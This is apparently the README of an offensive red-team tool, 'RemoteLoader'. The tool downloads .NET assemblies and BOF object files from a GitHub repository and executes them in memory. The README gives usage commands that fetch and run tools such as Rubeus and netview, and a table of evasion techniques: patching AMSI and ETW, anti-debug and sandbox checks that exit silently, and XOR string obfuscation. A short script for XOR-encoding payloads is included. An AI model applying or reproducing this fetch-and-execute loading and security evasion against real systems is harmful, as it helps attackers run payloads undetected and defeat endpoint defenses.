# Loaders

In-memory loader for authorized internal penetration testing. Supports managed
.NET assemblies (reflective load) and COFF/BOF x64 object files (in-process
COFF loader with Beacon API stubs).

---

## RemoteLoader.exe

Queries a GitHub repository, presents a numbered menu of available tools,
downloads the selected binary as raw bytes, and executes it entirely
in-memory — **nothing touches disk**.

| Payload type | Execution method |
|---|---|
| `.exe` / `.dll` — managed .NET | `Assembly.Load` → reflective invoke |
| `.o` — COFF/BOF x64 object file | In-process COFF loader with Beacon API stubs |
| Native PE (C++, Go, PyInstaller…) | Detected and rejected |

### Compilation

```cmd
cd RemoteLoader
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
```

Output: `RemoteLoader\bin\Release\net8.0\win-x64\publish\RemoteLoader.exe`

### Usage

```
RemoteLoader.exe --repo owner/name/subfolder [options]

Options:
  --repo    owner/name/subfolder  GitHub path (required)
  --branch  <branch>              Repo branch              (default: main)
  --token   <PAT>                 GitHub PAT for private repos or to avoid rate limits
  --xor     <byte>                XOR key (0-255) to decode payload before loading
  --list                          Print available binaries and exit (no download)
  --exec    <name>                Select binary by name/substring, skip interactive menu
  --args    <string>              Arguments to pass to the loaded tool (quoted string)
  --help                          Show help
```

Examples:

```cmd
RemoteLoader.exe --repo YourOrg/your-tools/bin
RemoteLoader.exe --repo YourOrg/your-tools/bin --list
RemoteLoader.exe --repo YourOrg/tools/bin --exec Rubeus --args "triage"
RemoteLoader.exe --repo YourOrg/private-tools/bin --token ghp_xxxx
RemoteLoader.exe --repo YourOrg/bofs/bin --exec whoami
RemoteLoader.exe --repo YourOrg/bofs/bin --exec netview --args "z=DOMAIN"
```

---

## BOF support

COFF/BOF x64 object files (`.o`) are detected automatically by checking for
`MachineType = IMAGE_FILE_MACHINE_AMD64` and `SizeOfOptionalHeader = 0`.

The in-process loader:

1. Allocates RWX memory for each COFF section
2. Resolves Beacon API symbols to built-in stubs and `DLL$Function` imports to
   the real Win32 addresses via `LoadLibrary` / `GetProcAddress`
3. Applies AMD64 relocations (`ADDR64`, `REL32`, `REL32_1`…`REL32_4`)
4. Calls the BOF's `go` entry point with packed binary arguments

### Beacon API stubs implemented

`BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, `BeaconDataInt`,
`BeaconDataShort`, `BeaconDataLength`, `BeaconDataExtract`,
`BeaconFormatAlloc`, `BeaconFormatReset`, `BeaconFormatFree`,
`BeaconFormatAppend`, `BeaconFormatPrintf`, `BeaconFormatToString`,
`BeaconIsAdmin`

Any `DLL$Function` symbol (e.g. `KERNEL32$CreateToolhelp32Snapshot`) is
resolved dynamically at load time.

### BOF argument format

Pass typed arguments via `--args` (or enter them at the interactive prompt):

| Prefix | Type | Example |
|---|---|---|
| `i=` | int32 | `i=1` |
| `s=` | int16 | `s=443` |
| `z=` | ASCII string (null-terminated) | `z=DOMAIN` |
| `Z=` | Wide string (null-terminated) | `Z=DOMAIN` |
| `b=` | Raw bytes (hex) | `b=deadbeef` |

Space-separated, order-significant. Example:

```cmd
RemoteLoader.exe --repo YourOrg/bofs/x64 --exec netview --args "z=CORP z=dc01"
```

---

## Evasion stack

| Layer | Technique | Detail |
|---|---|---|
| AMSI | P/Invoke patch | Patches `AmsiScanBuffer` to return `E_INVALIDARG`; sensitive strings XOR-decoded at runtime |
| ETW | `EtwEventWrite` + `EtwEventWriteFull` patch | Single `RET` suppresses all .NET CLR telemetry events |
| Anti-debug | `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` + timing | Exits silently if any debugger is detected |
| Sandbox | Uptime, process count, disk size, screen resolution, username | Exits silently if environment looks like an analysis VM |
| String obfuscation | XOR key `0x41` | `amsi.dll`, `AmsiScanBuffer`, `ntdll.dll`, `EtwEventWrite` never appear as plaintext |
| Payload encoding | XOR (optional) | Store binaries XOR-encoded in the repo; decoded in memory before loading |
| Network | TLS 1.2 + system proxy | Ensures connectivity through corporate proxies |

## XOR-encoding payloads for the repo

```python
# encode.py
key = 0x41
with open("Rubeus.exe", "rb") as f: data = f.read()
with open("Rubeus.exe.enc", "wb") as f: f.write(bytes(b ^ key for b in data))
```

Load with:

```cmd
RemoteLoader.exe --repo YourOrg/tools/bin --xor 65
```
